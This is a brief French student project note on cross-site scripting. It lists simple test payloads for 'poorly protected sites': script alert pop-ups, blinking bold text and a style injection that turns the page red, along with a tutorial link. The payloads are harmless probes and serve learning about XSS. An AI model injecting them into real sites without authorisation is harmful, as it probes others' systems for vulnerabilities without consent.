Projet sur Cross-Site-Scripting-XSS ou injection XSS

On a utilisé une injection en javascript pour faire apparaître une pop-up alert sur des sites peu protégés "<script>alert('XSS')</script>"

tien:
https://apcpedagogie.com/les-injections-html-xss/

<b style="text-decoration:blink ;"> Si ce texte est en gras et clignote, c’est que le site est vulnérable </b>
<b>Si ce texte est en gras, c’est que le site est potentiellement vulnérable</b>
<style type="text/css"> body { background-color : red ; background-image : none ; } </style>
<script type="text/javascript"> alert("Vulnérabilité détectée : faille XSS") ; </script>
<img src="./chat.jpg" title="Une image de mon chat" />
<script>alert('hackndo');</script>
<img src="./chat.jpg" title="Une image" /><script>alert('hackndo');</script>
